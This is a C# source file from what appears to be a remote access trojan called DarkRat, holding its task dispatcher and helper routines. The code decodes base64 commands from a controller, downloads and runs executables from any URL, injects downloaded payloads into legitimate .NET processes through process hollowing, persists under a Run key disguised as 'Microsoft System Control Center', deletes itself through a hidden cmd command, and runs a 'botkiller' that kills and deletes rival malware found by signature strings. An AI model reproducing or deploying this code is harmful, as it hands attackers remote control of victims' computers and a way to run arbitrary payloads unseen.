﻿using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Reflection;
using System.Diagnostics;
using System.Windows.Forms;
using System.Security.Principal;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace DarkRat.Classes
{
    class Misc
    {
        public static Thread bkillThread;
        public static string[] surrogates = { Environment.GetEnvironmentVariable("windir") + "\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe", Environment.GetEnvironmentVariable("windir") + "\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe" };
        private static Random r = new Random();
        public static string hash(string input)
        {
            MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider();
            byte[] temp = md5.ComputeHash(Encoding.UTF8.GetBytes(input));
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < temp.Length; i++)
            {
                sb.Append(temp[i].ToString("x2"));
            }
            return sb.ToString().ToUpper();
        }

        public static string getLocation()
        {
            string res = Assembly.GetExecutingAssembly().Location;
            if (res == "" || res == null)
            {
                res = Assembly.GetEntryAssembly().Location;
            }
            return res;
        }

        public static bool isAdmin()
        {
            WindowsIdentity id = WindowsIdentity.GetCurrent();
            WindowsPrincipal pr = new WindowsPrincipal(id);
            if (pr.IsInRole(WindowsBuiltInRole.Administrator))
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        public static string lastReboot()
        {
            string res = null;
            double since = new Microsoft.VisualBasic.Devices.Computer().Clock.TickCount / 1000 / 60;
            if (since > 60)
            {
                since = since / 60;
                if (since > 24)
                {
                    since = since / 24;
                    res = ((int)since).ToString() + " day(s) ago";
                }
                else
                {
                    res = ((int)since).ToString() + " hour(s) ago";
                }
            }
            else
            {
                res = ((int)since).ToString() + " minute(s) ago";
            }
            return res;
        }

        public static string randomString(int length)
        {
            char[] b = "abcdefghijklmnopqrstuvwxyz".ToCharArray();
            Microsoft.VisualBasic.VBMath.Randomize();
            StringBuilder s = new StringBuilder();
            for (int i = 1; i < length; i++)
            {
                int z = ((int)(((b.Length - 2) + 1) * Microsoft.VisualBasic.VBMath.Rnd())) + 1;
                s.Append(b[z]);
            }
            return s.ToString();
        }

        public static bool keyExists(string key)
        {
            bool exists = false;
            Microsoft.Win32.RegistryKey reg = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", false);
            foreach (string r in reg.GetValueNames())
            {
                if (r == key)
                    exists = true;
            }
            return exists;
        }

        public static bool processTask(string task, string param)
        {
            string dt = Encoding.UTF8.GetString(Convert.FromBase64String(task));
            string dp = Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(Convert.FromBase64String(param))));
            switch (dt)
            {
                case "1":
                    if (dlex(dp))
                        return true;
                    else
                        return false;
                case "2":
                    if (dlex(dp, "", true)) 
                        return true;
                    else
                        return false;
                case "11":
                    if (dlex(dp.Split('~')[0], dp.Split('~')[1], true))
                        return true;
                    else
                        return false;
                case "3":
                    if (dlex(dp.Split('~')[0], dp.Split('~')[1]))
                        return true;
                    else
                        return false;
                case "4":
                    if (visit(dp))
                        return true;
                    else
                        return false;
                case "5":
                    if (visit(dp, true))
                        return true;
                    else
                        return false;
                case "6":
                    if (bkill())
                        return true;
                    else
                        return false;
                case "7":
                    try
                    {
                        bkillThread = new Thread(new ThreadStart(bkillp));
                        bkillThread.Start();
                        return true;
                    }
                    catch
                    {
                        return false;
                    }
                case "8":
                    try
                    {
                        bkillThread.Abort();
                        bkillThread = null;
                        return true;
                    }
                    catch
                    {
                        return false;
                    }
                case "9":
                    if (update(dp))
                        return true;
                    else
                        return false;
                case "10":
                    if (uninstall())
                        return true;
                    else
                        return false;
                default:
                    return false;
            }
        }


        // BEGIN - Downloader
        private static bool dlex(string url, string cmdline = "", bool inject = false)
        {
            try
            {
                WebClient wc = new WebClient();
                wc.Proxy = null;
                if (!inject)
                {
                    string filename = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + randomString(7) + ".exe";
                    wc.DownloadFile(url, filename);
                    System.Diagnostics.ProcessStartInfo si = new System.Diagnostics.ProcessStartInfo();
                    si.FileName = filename;
                    si.Arguments = cmdline;
                    System.Diagnostics.Process.Start(si);
                    return true;
                }
                else
                {
                   if(cmdline == "")
                    {
                        byte[] file = wc.DownloadData(url);
                        RunPe2.Run(@"C:\Windows\Microsoft.NET\Framework\v2.0.50727\RegSvcs.exe", file, true);
                    }
                    else
                    {
                        byte[] file = wc.DownloadData(url);
                        Microsoft.VisualBasic.VBMath.Randomize();
                        string surrogate = surrogates[r.Next(0, surrogates.Length - 1)];
                        RunPe2.Run( @"C:\Windows\Microsoft.NET\Framework\v2.0.50727\Regasm.exe", file, true, cmdline);
                    }
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }
        private static bool update(string url)
        {
            try
            {
                dlex(url);
                Program.s.Abort();
                if (keyExists("Microsoft System Control Center"))
                {
                    Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    regkey.DeleteValue("Microsoft System Control Center");
                }
                System.Diagnostics.ProcessStartInfo si = new System.Diagnostics.ProcessStartInfo();
                si.FileName = "cmd.exe";
                si.Arguments = "/C ping 1.1.1.1 -n 1 -w 4000 > Nul & Del \"" + getLocation() + "\"";
                si.CreateNoWindow = true;
                si.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                System.Diagnostics.Process.Start(si);
                return true;
            }
            catch
            {
                return false;
            }
        }
        // END

        // BEGIN - Viewer
        // I am not sure if we need this, but too scared to delete. 
        private static bool visit(string url, bool hide = false)
        {
            try
            {
                if (!hide)
                {
                    System.Diagnostics.Process.Start(url);
                    return true;
                }
                else
                {
                    Thread view = new Thread(new ParameterizedThreadStart(viewhidden));
                    view.SetApartmentState(ApartmentState.STA);
                    view.Start(url);
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }
        private static void viewhidden(object url)
        {
            try
            {
                WebBrowser wb = new WebBrowser();
                wb.ScriptErrorsSuppressed = true;
                wb.Navigate((string)url);
                Application.Run();
            }
            catch { }
        }
        // END

        // BEGIN - Botkiller
        private static bool bkill()
        {
            Removal.ScanThread();
            return true;
        }
        private static void bkillp()
        {
            do
            {
                bkill();
                Thread.Sleep(r.Next(5000, 30000));
            } while (true);
        }
        // END

        // BEGIN - Uninstall
        private static bool uninstall()
        {
            try
            {
                Program.s.Abort();
                if (keyExists("Microsoft System Control Center"))
                {
                    Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    regkey.DeleteValue("Microsoft System Control Center");
                }
                System.Diagnostics.ProcessStartInfo si = new System.Diagnostics.ProcessStartInfo();
                si.FileName = "cmd.exe";
                si.Arguments = "/C ping 1.1.1.1 -n 1 -w 4000 > Nul & Del \"" + getLocation() + "\"";
                si.CreateNoWindow = true;
                si.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                System.Diagnostics.Process.Start(si);
                return true;
            }
            catch
            {
                return false;
            }
        }


        /* Credit goes to an unknown creator for the "Removal" class
         * Modified by Zettabit for better efficiency
         * 
         * BEGIN - Botkiller
         */
        // I am not sure if we need this, but too scared to delete. 
        public class Removal
        {
            public static string applocal = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            public static string temp = Environment.GetEnvironmentVariable("temp");
            public static string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            public static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            public static string users = Environment.GetEnvironmentVariable("userprofile");
            public static char split1 = (char)5;
            public static char split2 = (char)6;
            private static string[] keylogger = { "SetWindowsHookEx", "GetForegroundWindow", "GetWindowText", "GetAsyncKeyState" };
            private static string[] injector = { "SetThreadContext", "ZwUnmapViewOfSection", "VirtualAllocEx", "GetExecutingAssembly", "System.Reflection" };
            private static string[] ircbot = { "PRIVMSG", "JOIN", "USER", "NICK" };
            private static string[] generic = { "WSAStartup", "gethostbyname", "gethostbyaddr", "gethostname", "bs_fusion_bot", "MAP_GETCOUNTRY", "VS_VERSION_INFO", "LookupAccountNameA", "CryptUnprotectData", "Blackshades NET" };
            private static string[] crypter = { "MD5CryptoServiceProvider", "RijndaelManaged" };
            private static List<PossibleThreat> lobj = new List<PossibleThreat>();
            public struct PossibleThreat
            {
                public string fullpath;
                public bool running;
                public JudgedAs btype;
                public string regkey;
                public string exename;
            }
            public enum JudgedAs
            {
                Unknown = 17,
                Keylogger = 18,
                GenericBot = 19,
                Injector = 20,
                IRC_Bot = 21
            }
            public static void ScanThread()
            {
                Thread exscan = new Thread(new ThreadStart(scan));
                exscan.SetApartmentState(ApartmentState.STA);
                exscan.Start();
                GC.Collect();
            }
            public static void scan()
            {
                try
                {
                    lobj.Clear();
                    List<string> suspicious = new List<string>();
                    foreach (string s in returnHKCU("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
                    {
                        suspicious.Add(s);
                    }
                    foreach (string s in returnHKCU("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                    {
                        suspicious.Add(s);
                    }
                    foreach (string s in returnHKLM("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
                    {
                        suspicious.Add(s);
                    }
                    foreach (string s in returnHKLM("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                    {
                        suspicious.Add(s);
                    }
                    foreach (string s in returnDirs(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                    {
                        suspicious.Add(s);
                    }
                    foreach (string f in suspicious)
                    {
                        try
                        {
                            if (usepath(f.Split(split1)[0]))
                                lobj.Add(scanFile(f));
                        }
                        catch { }
                    }
                    for (int i = 0; i == lobj.Count - 1; i++)
                    {
                        removeThreat(i);
                    }
                }
                catch { }
            }
            public static PossibleThreat scanFile(string path)
            {
                try
                {
                    if (File.Exists(path.Split(split1)[0]))
                    {
                        PossibleThreat info = new PossibleThreat();
                        info.fullpath = path.Split(split1)[0];
                        info.regkey = path.Split(split1)[1];
                        info.running = isRunning(path);
                        info.exename = Path.GetFileName(info.fullpath);
                        info.btype = JudgedAs.Unknown;
                        if (info.fullpath == Misc.getLocation())
                            return new PossibleThreat();

                        string tempstr = Encoding.UTF8.GetString(File.ReadAllBytes(info.fullpath)).Trim((char)0);
                        if (tempstr != null)
                        {
                            foreach (string s in generic)
                            {
                                if (tempstr.Contains(s))
                                    info.btype = JudgedAs.GenericBot;
                            }
                            foreach (string s in keylogger)
                            {
                                if (tempstr.Contains(s))
                                    info.btype = JudgedAs.Keylogger;
                            }
                            foreach (string s in injector)
                            {
                                if (tempstr.Contains(s))
                                    info.btype = JudgedAs.Injector;
                            }
                            foreach (string s in ircbot)
                            {
                                if (tempstr.Contains(s))
                                    info.btype = JudgedAs.IRC_Bot;
                            }
                            return info;
                        }
                        else
                        {
                            return new PossibleThreat();
                        }
                    }
                    else
                    {
                        return new PossibleThreat();
                    }
                }
                catch { return new PossibleThreat(); }
            }
            private static void removeThreat(int lid)
            {
                try
                {
                    foreach (Process p in Process.GetProcesses())
                    {
                        try
                        {
                            if (p.MainModule.FileName == lobj[lid].fullpath)
                            {
                                p.Kill();
                                Thread.Sleep(1000);
                            }
                        }
                        catch { }
                    }
                    File.Delete(lobj[lid].fullpath);
                    Thread.Sleep(1000);
                    if (lobj[lid].regkey != "" || lobj[lid].regkey != null)
                    {
                        switch (lobj[lid].regkey.Split('\\')[0])
                        {
                            case "HKEY_CURRENT_USER":
                                string tmp = lobj[lid].regkey.Remove(0, lobj[lid].regkey.IndexOf("\\", StringComparison.Ordinal) + 1);
                                string subkey = tmp.Substring(0, tmp.LastIndexOf('\\'));
                                string name = tmp.Remove(0, tmp.LastIndexOf('\\') + 1);
                                Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(subkey, true);
                                regkey.DeleteValue(name);
                                break;

                            case "HKEY_LOCAL_MACHINE":
                                string tmp2 = lobj[lid].regkey.Remove(0, lobj[lid].regkey.IndexOf("\\", StringComparison.Ordinal) + 1);
                                string subkey2 = tmp2.Substring(0, tmp2.LastIndexOf('\\'));
                                string name2 = tmp2.Remove(0, tmp2.LastIndexOf('\\') + 1);
                                Microsoft.Win32.RegistryKey regkey2 = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(subkey2, true);
                                regkey2.DeleteValue(name2);
                                break;
                        }
                    }
                    Thread.Sleep(1000);
                }
                catch { }
            }
            private static bool usepath(string path)
            {
                if (path.Contains(users))
                    return true;
                else
                    return false;
            }
            private static List<string> returnHKCU(string key)
            {
                List<string> rstrs = new List<string>();
                foreach (string r in Microsoft.Win32.Registry.CurrentUser.OpenSubKey(key, false).GetValueNames())
                {
                    string rv = (string)Microsoft.Win32.Registry.CurrentUser.OpenSubKey(key, false).GetValue(r);
                    if (rv.Contains("\""))
                        rv = rv.Split('"')[1];
                    if (rv.Contains("-"))
                        rv = rv.Split('-')[0];
                    if (rv.Contains("/"))
                        rv = rv.Split('/')[0];
                    if (rv.Contains(".exe") || rv.Contains(".dll") || rv.Contains(".bat") || rv.Contains(".vbs") || rv.Contains(".scr"))
                        rstrs.Add(rv + split1 + "HKEY_CURRENT_USER\\" + key + "\\" + r);
                }
                return rstrs;
            }
            private static List<string> returnHKLM(string key)
            {
                List<string> rstrs = new List<string>();
                foreach (string r in Microsoft.Win32.Registry.LocalMachine.OpenSubKey(key, false).GetValueNames())
                {
                    string rv = (string)Microsoft.Win32.Registry.LocalMachine.OpenSubKey(key, false).GetValue(r);
                    if (rv.Contains("\""))
                        rv = rv.Split('"')[1];
                    if (rv.Contains("-"))
                        rv = rv.Split('-')[0];
                    if (rv.Contains("/"))
                        rv = rv.Split('/')[0];
                    if (rv.Contains(".exe") || rv.Contains(".dll") || rv.Contains(".bat") || rv.Contains(".vbs") || rv.Contains(".scr"))
                        rstrs.Add(rv + split1 + "HKEY_LOCAL_MACHINE\\" + key + "\\" + r);
                }
                return rstrs;
            }
            private static List<string> returnDirs(string path)
            {
                List<string> rstrs = new List<string>();
                foreach (FileInfo f in new DirectoryInfo(path).GetFiles())
                {
                    if (f.FullName.Contains(".exe") || f.FullName.Contains(".dll") || f.FullName.Contains(".bat") || f.FullName.Contains(".vbs") || f.FullName.Contains(".scr"))
                        rstrs.Add(f.FullName + split1 + f.FullName);
                }
                return rstrs;
            }
            private static bool isRunning(string fullpath)
            {
                bool ret = false;
                try
                {
                    foreach (Process p in Process.GetProcesses())
                    {
                        if (p.MainModule.FileName == fullpath)
                            ret = true;
                        break;
                    }
                }
                catch { }
                return ret;
            }
        }
        // END
    }
}
